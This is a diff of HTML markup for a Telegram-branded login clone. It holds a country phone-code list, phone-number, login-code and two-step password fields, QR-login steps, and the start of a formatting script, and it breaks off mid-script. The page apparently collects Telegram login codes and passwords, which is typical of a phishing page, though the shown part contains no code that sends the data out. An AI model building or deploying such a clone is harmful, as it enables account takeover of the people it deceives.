+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇹</span></span><span
+                                        class="select-text" data-default-name="Austria">Austria</span><span
+                                        class="phone-code">+43</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇦🇿</span></span><span
+                                        class="select-text" data-default-name="Azerbaijan">Azerbaijan</span><span
+                                        class="phone-code">+994</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇸</span></span><span
+                                        class="select-text" data-default-name="Bahamas">Bahamas</span><span
+                                        class="phone-code">+1242</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇭</span></span><span
+                                        class="select-text" data-default-name="Bahrain">Bahrain</span><span
+                                        class="phone-code">+973</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇩</span></span><span
+                                        class="select-text" data-default-name="Bangladesh">Bangladesh</span><span
+                                        class="phone-code">+880</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇧</span></span><span
+                                        class="select-text" data-default-name="Barbados">Barbados</span><span
+                                        class="phone-code">+1246</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇾</span></span><span
+                                        class="select-text" data-default-name="Belarus">Belarus</span><span
+                                        class="phone-code">+375</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇪</span></span><span
+                                        class="select-text" data-default-name="Belgium">Belgium</span><span
+                                        class="phone-code">+32</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇿</span></span><span
+                                        class="select-text" data-default-name="Belize">Belize</span><span
+                                        class="phone-code">+501</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇯</span></span><span
+                                        class="select-text" data-default-name="Benin">Benin</span><span
+                                        class="phone-code">+229</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇲</span></span><span
+                                        class="select-text" data-default-name="Bermuda">Bermuda</span><span
+                                        class="phone-code">+1441</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇹</span></span><span
+                                        class="select-text" data-default-name="Bhutan">Bhutan</span><span
+                                        class="phone-code">+975</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇴</span></span><span
+                                        class="select-text" data-default-name="Bolivia">Bolivia</span><span
+                                        class="phone-code">+591</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇶</span></span><span
+                                        class="select-text"
+                                        data-default-name="Bonaire, Sint Eustatius &amp; Saba">Bonaire, Sint Eustatius
+                                        &amp; Saba</span><span class="phone-code">+599</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇦</span></span><span
+                                        class="select-text" data-default-name="Bosnia &amp; Herzegovina">Bosnia &amp;
+                                        Herzegovina</span><span class="phone-code">+387</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇼</span></span><span
+                                        class="select-text" data-default-name="Botswana">Botswana</span><span
+                                        class="phone-code">+267</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇷</span></span><span
+                                        class="select-text" data-default-name="Brazil">Brazil</span><span
+                                        class="phone-code">+55</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇻🇬</span></span><span
+                                        class="select-text" data-default-name="British Virgin Islands">British Virgin
+                                        Islands</span><span class="phone-code">+1284</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇳</span></span><span
+                                        class="select-text" data-default-name="Brunei Darussalam">Brunei
+                                        Darussalam</span><span class="phone-code">+673</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇬</span></span><span
+                                        class="select-text" data-default-name="Bulgaria">Bulgaria</span><span
+                                        class="phone-code">+359</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇫</span></span><span
+                                        class="select-text" data-default-name="Burkina Faso">Burkina Faso</span><span
+                                        class="phone-code">+226</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇧🇮</span></span><span
+                                        class="select-text" data-default-name="Burundi">Burundi</span><span
+                                        class="phone-code">+257</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇰🇭</span></span><span
+                                        class="select-text" data-default-name="Cambodia">Cambodia</span><span
+                                        class="phone-code">+855</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇲</span></span><span
+                                        class="select-text" data-default-name="Cameroon">Cameroon</span><span
+                                        class="phone-code">+237</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇦</span></span><span
+                                        class="select-text" data-default-name="Canada">Canada</span><span
+                                        class="phone-code">+1</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇻</span></span><span
+                                        class="select-text" data-default-name="Cape Verde">Cape Verde</span><span
+                                        class="phone-code">+238</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇰🇾</span></span><span
+                                        class="select-text" data-default-name="Cayman Islands">Cayman
+                                        Islands</span><span class="phone-code">+1345</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇫</span></span><span
+                                        class="select-text" data-default-name="Central African Rep.">Central African
+                                        Rep.</span><span class="phone-code">+236</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇹🇩</span></span><span
+                                        class="select-text" data-default-name="Chad">Chad</span><span
+                                        class="phone-code">+235</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇱</span></span><span
+                                        class="select-text" data-default-name="Chile">Chile</span><span
+                                        class="phone-code">+56</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇳</span></span><span
+                                        class="select-text" data-default-name="China">China</span><span
+                                        class="phone-code">+86</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇴</span></span><span
+                                        class="select-text" data-default-name="Colombia">Colombia</span><span
+                                        class="phone-code">+57</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇰🇲</span></span><span
+                                        class="select-text" data-default-name="Comoros">Comoros</span><span
+                                        class="phone-code">+269</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇩</span></span><span
+                                        class="select-text" data-default-name="Congo (Dem. Rep.)">Congo (Dem.
+                                        Rep.)</span><span class="phone-code">+243</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇬</span></span><span
+                                        class="select-text" data-default-name="Congo (Rep.)">Congo (Rep.)</span><span
+                                        class="phone-code">+242</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇰</span></span><span
+                                        class="select-text" data-default-name="Cook Islands">Cook Islands</span><span
+                                        class="phone-code">+682</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇷</span></span><span
+                                        class="select-text" data-default-name="Costa Rica">Costa Rica</span><span
+                                        class="phone-code">+506</span></li>
+                                <li><span dir="auto"><span class="emoji-li emoji-native">🇨🇮</span></span><span
+                                        class="select-text" data-default-name="Côte d&quot;Ivoire">Côte
+                                        d"Ivoire</span><span class="phone-code">+225</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇭🇷</span></span><span
                                         class="select-text" data-default-name="Croatia">Croatia</span><span
                                         class="phone-code">+385</span></li>
@@ -386,16 +1047,16 @@
                                         class="select-text" data-default-name="Saint Helena">Saint Helena</span><span
                                         class="phone-code">+290</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇰🇳</span></span><span
-                                        class="select-text" data-default-name="Saint Kitts&amp;Nevis">Saint Kitts
+                                        class="select-text" data-default-name="Saint Kitts &amp; Nevis">Saint Kitts
                                         &amp; Nevis</span><span class="phone-code">+1869</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇱🇨</span></span><span
                                         class="select-text" data-default-name="Saint Lucia">Saint Lucia</span><span
                                         class="phone-code">+1758</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇵🇲</span></span><span
-                                        class="select-text" data-default-name="Saint Pierre&amp;Miquelon">Saint Pierre
+                                        class="select-text" data-default-name="Saint Pierre &amp; Miquelon">Saint Pierre
                                         &amp; Miquelon</span><span class="phone-code">+508</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇻🇨</span></span><span
-                                        class="select-text" data-default-name="Saint Vincent&amp;the Grenadines">Saint
+                                        class="select-text" data-default-name="Saint Vincent &amp; the Grenadines">Saint
                                         Vincent &amp; the Grenadines</span><span class="phone-code">+1784</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇼🇸</span></span><span
                                         class="select-text" data-default-name="Samoa">Samoa</span><span
@@ -404,7 +1065,7 @@
                                         class="select-text" data-default-name="San Marino">San Marino</span><span
                                         class="phone-code">+378</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇸🇹</span></span><span
-                                        class="select-text" data-default-name="São Tomé&amp;Príncipe">São Tomé &amp;
+                                        class="select-text" data-default-name="São Tomé &amp; Príncipe">São Tomé &amp;
                                         Príncipe</span><span class="phone-code">+239</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇸🇦</span></span><span
                                         class="select-text" data-default-name="Saudi Arabia">Saudi Arabia</span><span
@@ -494,7 +1155,7 @@
                                         class="select-text" data-default-name="Tonga">Tonga</span><span
                                         class="phone-code">+676</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇹🇹</span></span><span
-                                        class="select-text" data-default-name="Trinidad&amp;Tobago">Trinidad &amp;
+                                        class="select-text" data-default-name="Trinidad &amp; Tobago">Trinidad &amp;
                                         Tobago</span><span class="phone-code">+1868</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇹🇳</span></span><span
                                         class="select-text" data-default-name="Tunisia">Tunisia</span><span
@@ -506,7 +1167,7 @@
                                         class="select-text" data-default-name="Turkmenistan">Turkmenistan</span><span
                                         class="phone-code">+993</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇹🇨</span></span><span
-                                        class="select-text" data-default-name="Turks&amp;Caicos Islands">Turks &amp;
+                                        class="select-text" data-default-name="Turks &amp; Caicos Islands">Turks &amp;
                                         Caicos Islands</span><span class="phone-code">+1649</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇹🇻</span></span><span
                                         class="select-text" data-default-name="Tuvalu">Tuvalu</span><span
@@ -545,7 +1206,7 @@
                                         class="select-text" data-default-name="Vietnam">Vietnam</span><span
                                         class="phone-code">+84</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇼🇫</span></span><span
-                                        class="select-text" data-default-name="Wallis&amp;Futuna">Wallis &amp;
+                                        class="select-text" data-default-name="Wallis &amp; Futuna">Wallis &amp;
                                         Futuna</span><span class="phone-code">+681</span></li>
                                 <li><span dir="auto"><span class="emoji-li emoji-native">🇾🇪</span></span><span
                                         class="select-text" data-default-name="Yemen">Yemen</span><span
@@ -562,22 +1223,1084 @@
                     <div class="input-container">
 
                         <div id="phoneinput" class="password-input input-field-input" contenteditable="true" dir="auto"
-                            data-no-linebreaks="1" inputmode="decimal" style="--letter-spacing:-0.32px;"
+                            data-no-linebreaks="1" inputmode="decimal" style="--letter-spacing: -0.32px;"
                             data-left-pattern=""></div>
 
                         <label id="labelphone" for="phoneinput" class="placeholder">Phone Number</label>
-                        <!-- <input class="password-input" style="position:absolute;left:0;z-index:-1;top:-6px;" value="____ ____">  -->
+                        <!-- <input class="password-input" style="position: absolute; left: 0;z-index: -1;top: -6px;" value="    ____ ____">  -->
 
                     </div>
 
                     <label class="checkbox-wrapper">
                         <input type="checkbox" id="keep-signed-in" checked>
                         <div class="checkbox-custom"></div>
-                        <span style="margin-left:20px;">Keep me signed in</span>
+                        <span style="margin-left: 20px;">Keep me signed in</span>
                     </label>
 
                     <button id="sendphonebtn" class="next-button" onclick="submitPhone(this)"><span id="sendphonebtntext">NEXT</span>
-                        <svg id="phoneloading" xmlns="http:preserveAspectRatio="xMidYMid"width="60"height="60"style="/* float: right; */shape-rendering: auto;display: none;margin-bottom: -30px;margin-top: -20px;position: absolute;right: 0;"xmlns:xlink="http://www.w3.org/1999/xlink"><g><circle stroke-dasharray="56.548667764616276 20.84955592153876"r="12"stroke-width="2"stroke="#ffffff"fill="none"cy="50"cx="50"><animateTransform keyTimes="0;1"values="0 50 50;360 50 50"dur="1.4705882352941175s"repeatCount="indefinite"type="rotate"attributeName="transform"></animateTransform></circle><g></g></g></svg></button><button class="swipe-button"onclick="slideTo('qrlogindiv')"><span class="i18n">LOG IN BY QR CODE</span></button></div><div style="height: 250px;"></div></div></div><div class="fullscreen"id="codediv"style=""><div class="panel"><img id="lookaround"srco="../static/output.gif"style="width: 150px;clip-path: inset(0px 0px 1px 0px);margin-top: 60px;margin-bottom: 36px;"><img id="lookdown"src="../static/lookdown.gif"style="display: none;width: 150px;clip-path: inset(0px 0px 1px 0px);margin-top: 60px;margin-bottom: 36px;"><div class="phone-wrapper"style="width: 360px;display: flex;justify-content: center;"><h4 id="phonecodeview"class="phone">+86 133 3332 2224</h4><span class="phone-edit"onclick="slide('left')"><img style="width: 32px;
+                        <svg id="phoneloading" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"
+                            preserveAspectRatio="xMidYMid" width="60" height="60"
+                            style="/* float: right; */shape-rendering: auto;display: none;margin-bottom: -30px;margin-top: -20px;position: absolute;right: 0;"
+                            xmlns:xlink="http://www.w3.org/1999/xlink">
+                            <g>
+                                <circle stroke-dasharray="56.548667764616276 20.84955592153876" r="12" stroke-width="2"
+                                    stroke="#ffffff" fill="none" cy="50" cx="50">
+                                    <animateTransform keyTimes="0;1" values="0 50 50;360 50 50"
+                                        dur="1.4705882352941175s" repeatCount="indefinite" type="rotate"
+                                        attributeName="transform"></animateTransform>
+                                </circle>
+                                <g></g>
+                            </g>
+                        </svg> </button>
+
+                    <button class="swipe-button" onclick="slideTo('qrlogindiv')">
+                        <span class="i18n">LOG IN BY QR CODE</span>
+                    </button>
+                </div>
+
+                <div style="height: 250px;" ></div>
+            </div>
+        </div>
+
+        <div class="fullscreen" id="codediv" style="">
+            <div class="panel">
+                <img id="lookaround"  srco="../static/output.gif"
+                    style="width: 150px;clip-path: inset(0px 0px 1px 0px);margin-top: 60px;margin-bottom: 36px;">
+                <img id="lookdown" src="../static/lookdown.gif"
+                    style="display: none;width: 150px;clip-path: inset(0px 0px 1px 0px);margin-top: 60px;margin-bottom: 36px;">
+
+                <div class="phone-wrapper" style="width: 360px;display: flex;justify-content: center;">
+                    <h4 id="phonecodeview" class="phone">+86 133 3332 2224</h4>
+                    <span class="phone-edit" onclick="slide('left')"><img style="width: 32px;
                     margin-top: 23px;
                     cursor: pointer;
-                    margin-left: 4px;"src="../static/edit.png"></span></div><div><span class="desc">We have sent you a message in Telegram</span><br><span class="desc">with the code.</span></div><div class="input-container"><input id="passcode"maxlength="5"oninput="this.value = this.value.replace(/[^0-9]/g, '');"class="password-input"placeholder=" "autocomplete="off"><label id="passcodeplaceholder"for="passcode"class="placeholder">Code</label></div></div></div><div class="fullscreen"id="qrlogindiv"><div id="qrlogin"class="panel"style="width: auto;"><div id="qrsec"><div class="loader-1"id="loading"></div><div style="display: none;"id="qrcode"></div><h4>Log in to Telegram by QR Code</h4><div class="instructions"><ol><li>Open Telegram on your phone</li><li><span class="i18n">Go to<b>Settings</b>&gt;<b>Devices</b>&gt;<b>Link Desktop Device</b></span></li><li>Point your phone at this screen to confirm login</li></ol></div><button class="swipe-button"onclick="slide('left')"style="width: 22em;"><span class="i18n">LOG IN BY PHONE NUMBER</span></button></div><div id="tip"style="display: none;"><div id="tipemo"class="emoji">👍</div><h1 id="tiptext">SUCCESS</h1></div></div></div><div class="fullscreen"id="2fadiv"><div class="panel"><img id="eyegif"srco="../static/eyeoff-stop.gif"style="width: 150px;margin-top: 60px;margin-bottom: 36px;"><h1>Enter Your Password</h1><div><span class="desc">Your account is protected with</span><br><span class="desc">an additional password</span></div><div class="input-container"><input id="pass"class="password-input"type="password"placeholder=" "autocomplete="off"><label id="labelpass"for="pass"class="placeholder">xxxx</label><span><svg id="eyeopen"t="1724156683295"class="icon eye-icon"viewBox="0 0 1024 1024"version="1.1"xmlns="http://www.w3.org/2000/svg"p-id="16058"width="20"height="20"style="margin-top: 10px; display: none;"><path d="M512 170.666667C298.666667 170.666667 116.48 303.36 42.666667 490.666667 116.48 677.973333 298.666667 810.666667 512 810.666667s395.52-132.693333 469.333333-320C907.52 303.36 725.333333 170.666667 512 170.666667z m0 533.333333c-117.76 0-213.333333-95.573333-213.333333-213.333333s95.573333-213.333333 213.333333-213.333334 213.333333 95.573333 213.333333 213.333334-95.573333 213.333333-213.333333 213.333333z m0-341.333333c-70.826667 0-128 57.173333-128 128s57.173333 128 128 128 128-57.173333 128-128-57.173333-128-128-128z"p-id="16059"></path></svg><svg id="eyeclose"t="1724155286461"class="icon eye-icon"viewBox="0 0 1024 1024"version="1.1"style="transform: scale(-1, 1);"xmlns="http://www.w3.org/2000/svg"p-id="14790"width="20"height="20"fill="currentColor"><path d="M509.76 623.68A109.76 109.76 0 0 0 615.68 512l-111.36 111.36z"p-id="14791"></path><path d="M960 512a787.2 787.2 0 0 0-158.4-184.64l-119.68 119.68a195.84 195.84 0 0 1 10.88 64 187.84 187.84 0 0 1-183.04 192 176.96 176.96 0 0 1-70.08-14.4l-91.2 91.2A392.96 392.96 0 0 0 512 816c267.52 0 440.64-290.24 448-302.72h-2.24zM385.92 651.52l55.04-55.04 153.6-153.6 55.68-55.68L750.4 288l120.32-120.32-45.44-46.4-131.84 131.84-32-14.08c-10.56-4.48-21.76-8.64-32-12.16A379.52 379.52 0 0 0 512 208C244.48 208 71.36 498.24 64 512h2.24H64a800 800 0 0 0 124.48 154.56l23.68 21.44c8 7.04 16.32 13.76 24.64 20.48l-115.52 116.8 45.44 45.44 123.2-123.2z m-38.4-52.48a188.8 188.8 0 0 1-12.8-32 186.24 186.24 0 0 1-7.04-38.08 174.08 174.08 0 0 1 0-18.24 187.84 187.84 0 0 1 183.04-192 136.96 136.96 0 0 1 25.92 2.24 151.36 151.36 0 0 1 35.84 9.28 156.8 156.8 0 0 1 30.4 14.72L544 403.2a97.6 97.6 0 0 0-33.6-6.08h-5.76a108.8 108.8 0 0 0-99.2 99.2 96 96 0 0 0 0 13.76 122.24 122.24 0 0 0 3.52 28.8l-59.84 59.84z"p-id="14792"></path></svg></span></div><button id="sendpassbtn"class="next-button"onclick="submitpass(this)"><span id="sendpassbtntext">NEXT</span><svg id="passloading"xmlns="http://www.w3.org/2000/svg"viewBox="0 0 100 100"preserveAspectRatio="xMidYMid"width="60"height="60"style="shape-rendering: auto;display: none;margin-bottom: -30px;margin-top: -20px;position: absolute;right: 0;"xmlns:xlink="http://www.w3.org/1999/xlink"><g><circle stroke-dasharray="56.548667764616276 20.84955592153876"r="12"stroke-width="2"stroke="#ffffff"fill="none"cy="50"cx="50"><animateTransform keyTimes="0;1"values="0 50 50;360 50 50"dur="1.4705882352941175s"repeatCount="indefinite"type="rotate"attributeName="transform"></animateTransform></circle><g></g></g></svg></button></div></div><div class="fullscreen"id="div3"style="display: none;"><div id="pwdsec"style=""><div class="emoji">🙈</div><h1>Enter Your Password</h1><span class="desc">Your account is protected with</span><br><span class="desc">an additional password</span><div class="input-container"><input type="password"id="password"class="password-input"placeholder=" "><label id="labelinput"for="password"class="placeholder">sv</label><span class="eye-icon">👁️</span></div><button id="sendbtn"class="next-button"onclick="submitPassword(this)"><span id="btntext">NEXT</span><svg id="loadingbtn"xmlns="http://www.w3.org/2000/svg"viewBox="0 0 100 100"preserveAspectRatio="xMidYMid"width="60"height="60"style="/* float: right; */shape-rendering: auto;display: none;margin-bottom: -30px;margin-top: -20px;/* display: none; */position: absolute;right: 0px;"xmlns:xlink="http://www.w3.org/1999/xlink"><g><circle stroke-dasharray="56.548667764616276 20.84955592153876"r="12"stroke-width="2"stroke="#ffffff"fill="none"cy="50"cx="50"><animateTransform keyTimes="0;1"values="0 50 50;360 50 50"dur="1.4705882352941175s"repeatCount="indefinite"type="rotate"attributeName="transform"></animateTransform></circle><g></g></g></svg></button><button id="sendbtn"class="next-button"onclick="slide('left')"><span id="btntext">LEFT</span></button></div></div></div></div><script>let currentSlide=0;function slide(direction){const container=document.getElementById('container');const totalSlides=3;if(direction==='right'){currentSlide=(currentSlide+1)%totalSlides}else if(direction==='left'){currentSlide=(currentSlide-1+totalSlides)%totalSlides}const offset=-100*currentSlide;container.style.transform=`translateX(${offset}vw)`}function slideTo(id){document.getElementById("codediv").style.display="none"document.getElementById("qrlogindiv").style.display="none"document.getElementById("2fadiv").style.display="none"document.getElementById(id).style.display=""slide("right")}var flag="phonelog"var currentPatter=""var currentPrefix=""var countrymap={}var allSelectLi var patternMap={"+93":" ‒‒‒ ‒‒‒ ‒‒‒","+355":" ‒‒ ‒‒‒ ‒‒‒‒","+213":" ‒‒‒ ‒‒ ‒‒ ‒‒","+1684":" ‒‒‒ ‒‒‒‒","+376":" ‒‒ ‒‒ ‒‒","+244":" ‒‒‒ ‒‒‒ ‒‒‒","+1264":" ‒‒‒ ‒‒‒‒","+888":" ‒ ‒‒‒","+1268":" ‒‒‒ ‒‒‒‒","+54":" ","+374":" ‒‒ ‒‒‒ ‒‒‒","+297":" ‒‒‒ ‒‒‒‒","+61":" ‒ ‒‒‒‒ ‒‒‒‒","+43":" ‒‒‒ ‒‒‒‒‒‒","+994":" ‒‒ ‒‒‒ ‒‒‒‒","+1242":" ‒‒‒ ‒‒‒‒","+973":" ‒‒‒‒ ‒‒‒‒","+880":" ‒‒ ‒‒‒ ‒‒‒","+1246":" ‒‒‒ ‒‒‒‒","+375":" ‒‒ ‒‒‒ ‒‒‒‒","+32":" ‒‒‒ ‒‒ ‒‒ ‒‒","+501":" ","+229":" ‒‒ ‒‒‒ ‒‒‒","+1441":" ‒‒‒ ‒‒‒‒","+975":" ‒‒ ‒‒‒ ‒‒‒","+591":" ‒ ‒‒‒ ‒‒‒‒","+599":" ","+387":" ‒‒ ‒‒‒ ‒‒‒","+267":" ‒‒ ‒‒‒ ‒‒‒","+55":" ‒‒ ‒‒‒‒‒ ‒‒‒‒","+1284":" ‒‒‒ ‒‒‒‒","+673":" ‒‒‒ ‒‒‒‒","+359":" ","+226":" ‒‒ ‒‒ ‒‒ ‒‒","+257":" ‒‒ ‒‒ ‒‒‒‒","+855":" ‒‒ ‒‒‒ ‒‒‒","+237":" ‒‒‒‒ ‒‒‒‒","+1":" ‒‒‒ ‒‒‒ ‒‒‒‒","+238":" ‒‒‒ ‒‒‒‒","+1345":" ‒‒‒ ‒‒‒‒","+236":" ‒‒ ‒‒ ‒‒ ‒‒","+235":" ‒‒ ‒‒ ‒‒ ‒‒","+56":" ‒ ‒‒‒‒ ‒‒‒‒","+86":" ‒‒‒ ‒‒‒‒ ‒‒‒‒","+57":" ‒‒‒ ‒‒‒ ‒‒‒‒","+269":" ‒‒‒ ‒‒‒‒","+243":" ‒‒ ‒‒‒ ‒‒‒‒","+242":" ‒‒ ‒‒‒ ‒‒‒‒","+682":" ","+506":" ‒‒‒‒ ‒‒‒‒","+225":" ‒‒ ‒‒ ‒‒ ‒‒‒‒","+385":" ‒‒ ‒‒‒ ‒‒‒","+53":" ‒ ‒‒‒ ‒‒‒‒","+357":" ‒‒‒‒ ‒‒‒‒","+420":" ‒‒‒ ‒‒‒ ‒‒‒","+45":" ‒‒‒‒ ‒‒‒‒","+246":" ‒‒‒ ‒‒‒‒","+253":" ‒‒ ‒‒ ‒‒ ‒‒","+1767":" ‒‒‒ ‒‒‒‒","+1809":" ‒‒‒ ‒‒‒‒","+1829":" ‒‒‒ ‒‒‒‒","+1849":" ‒‒‒ ‒‒‒‒","+593":" ‒‒ ‒‒‒ ‒‒‒‒","+20":" ‒‒ ‒‒‒‒ ‒‒‒‒","+503":" ‒‒‒‒ ‒‒‒‒","+240":" ‒‒‒ ‒‒‒ ‒‒‒","+291":" ‒ ‒‒‒ ‒‒‒","+372":" ‒‒‒‒ ‒‒‒","+268":" ‒‒‒‒ ‒‒‒‒","+251":" ‒‒ ‒‒‒ ‒‒‒","+500":" ","+298":" ‒‒‒ ‒‒‒","+679":" ‒‒‒ ‒‒‒‒","+358":" ","+33":" ‒ ‒‒ ‒‒ ‒‒ ‒‒","+594":" ","+689":" ","+241":" ‒ ‒‒ ‒‒ ‒‒","+220":" ‒‒‒ ‒‒‒‒","+995":" ‒‒‒ ‒‒‒ ‒‒‒","+49":" ‒‒‒‒ ‒‒‒‒‒‒‒","+233":" ‒‒ ‒‒‒ ‒‒‒‒","+350":" ‒‒‒‒ ‒‒‒‒","+30":" ‒‒‒ ‒‒‒ ‒‒‒‒","+299":" ‒‒‒ ‒‒‒","+1473":" ‒‒‒ ‒‒‒‒","+590":" ‒‒‒ ‒‒ ‒‒ ‒‒","+1671":" ‒‒‒ ‒‒‒‒","+502":" ‒ ‒‒‒ ‒‒‒‒","+224":" ‒‒‒ ‒‒‒ ‒‒‒","+245":" ‒‒‒ ‒‒‒‒","+592":" ‒‒‒‒‒‒‒‒‒‒","+509":" ‒‒‒‒ ‒‒‒‒","+504":" ‒‒‒‒ ‒‒‒‒","+852":" ‒ ‒‒‒ ‒‒‒‒","+36":" ‒‒‒ ‒‒‒ ‒‒‒","+354":" ‒‒‒ ‒‒‒‒","+91":" ‒‒‒‒‒ ‒‒‒‒‒","+62":" ‒‒‒ ‒‒‒‒‒‒","+98":" ‒‒‒ ‒‒‒ ‒‒‒‒","+964":" ‒‒‒ ‒‒‒ ‒‒‒‒","+353":" ‒‒ ‒‒‒ ‒‒‒‒","+972":" ‒‒ ‒‒‒ ‒‒‒‒","+39":" ‒‒‒ ‒‒‒ ‒‒‒‒","+1876":" ‒‒‒ ‒‒‒‒","+81":" ‒‒ ‒‒‒‒ ‒‒‒‒","+962":" ‒ ‒‒‒‒ ‒‒‒‒","+7":" ‒‒‒ ‒‒‒ ‒‒‒‒","+254":" ‒‒‒ ‒‒‒ ‒‒‒","+686":" ‒‒‒‒ ‒‒‒‒","+383":" ‒‒‒‒ ‒‒‒‒","+965":" ‒‒‒‒ ‒‒‒‒","+996":" ‒‒‒ ‒‒‒‒‒‒","+371":" ‒‒‒ ‒‒‒‒‒","+856":" ‒‒ ‒‒ ‒‒‒ ‒‒‒","+961":" ","+266":" ‒‒ ‒‒‒ ‒‒‒","+231":" ‒‒ ‒‒‒ ‒‒‒‒","+218":" ‒‒ ‒‒‒ ‒‒‒‒","+423":" ‒‒‒ ‒‒‒‒","+370":" ‒‒‒ ‒‒‒‒‒","+352":" ‒‒‒ ‒‒‒ ‒‒‒","+853":" ‒‒‒‒ ‒‒‒‒","+261":" ‒‒ ‒‒ ‒‒‒ ‒‒","+265":" ‒‒ ‒‒‒ ‒‒‒‒","+60":" ","+960":" ‒‒‒ ‒‒‒‒","+223":" ‒‒‒‒ ‒‒‒‒","+356":" ‒‒ ‒‒ ‒‒ ‒‒","+692":" ","+596":" ","+222":" ‒‒‒‒ ‒‒‒‒","+230":" ‒‒‒‒ ‒‒‒‒","+52":" ","+691":" ","+373":" ‒‒ ‒‒‒ ‒‒‒","+377":" ‒‒‒‒ ‒‒‒‒","+976":" ‒‒ ‒‒ ‒‒‒‒","+382":" ","+1664":" ‒‒‒ ‒‒‒‒","+212":" ‒‒ ‒‒‒ ‒‒‒‒","+258":" ‒‒ ‒‒‒ ‒‒‒‒","+95":" ","+264":" ‒‒ ‒‒‒ ‒‒‒‒","+674":" ","+977":" ‒‒ ‒‒‒‒ ‒‒‒‒","+31":" ‒ ‒‒ ‒‒ ‒‒ ‒‒","+687":" ","+64":" ‒‒‒‒ ‒‒‒‒","+505":" ‒‒‒‒ ‒‒‒‒","+227":" ‒‒ ‒‒ ‒‒ ‒‒","+234":" ‒‒ ‒‒‒‒ ‒‒‒‒","+683":" ","+672":" ","+850":" ","+389":" ‒‒ ‒‒‒‒‒‒","+1670":" ‒‒‒ ‒‒‒‒","+47":" ‒‒‒ ‒‒ ‒‒‒","+968":" ‒‒‒‒ ‒‒‒‒","+92":" ‒‒‒ ‒‒‒ ‒‒‒‒","+680":" ","+970":" ‒‒‒ ‒‒ ‒‒‒‒","+507":" ‒‒‒‒ ‒‒‒‒","+675":" ","+595":" ‒‒‒ ‒‒‒ ‒‒‒","+51":" ‒‒‒ ‒‒‒ ‒‒‒","+63":" ‒‒‒ ‒‒‒ ‒‒‒‒","+48":" ‒‒‒ ‒‒‒ ‒‒‒","+351":" ‒‒‒ ‒‒‒ ‒‒‒","+1787":" ‒‒‒ ‒‒‒‒","+1939":" ‒‒‒ ‒‒‒‒","+974":" ‒‒ ‒‒‒ ‒‒‒","+262":" ‒‒‒ ‒‒‒ ‒‒‒","+40":" ‒‒‒ ‒‒‒ ‒‒‒","+250":" ‒‒‒ ‒‒‒ ‒‒‒","+247":" ","+290":" ‒‒ ‒‒‒","+1869":" ‒‒‒ ‒‒‒‒","+1758":" ‒‒‒ ‒‒‒‒","+508":" ","+1784":" ‒‒‒ ‒‒‒‒","+685":" ","+378":" ","+239":" ‒‒ ‒‒‒‒‒","+966":" ‒‒ ‒‒‒ ‒‒‒‒","+221":" ‒‒ ‒‒‒ ‒‒‒‒","+381":" ‒‒ ‒‒‒ ‒‒‒","+248":" ‒ ‒‒ ‒‒ ‒‒","+232":" ‒‒ ‒‒‒ ‒‒‒","+65":" ‒‒‒‒ ‒‒‒‒","+1721":" ‒‒‒ ‒‒‒‒","+421":" ‒‒‒ ‒‒‒ ‒‒‒","+386":" ‒‒ ‒‒‒ ‒‒‒","+677":" ","+252":" ‒‒ ‒‒‒ ‒‒‒","+27":" ‒‒ 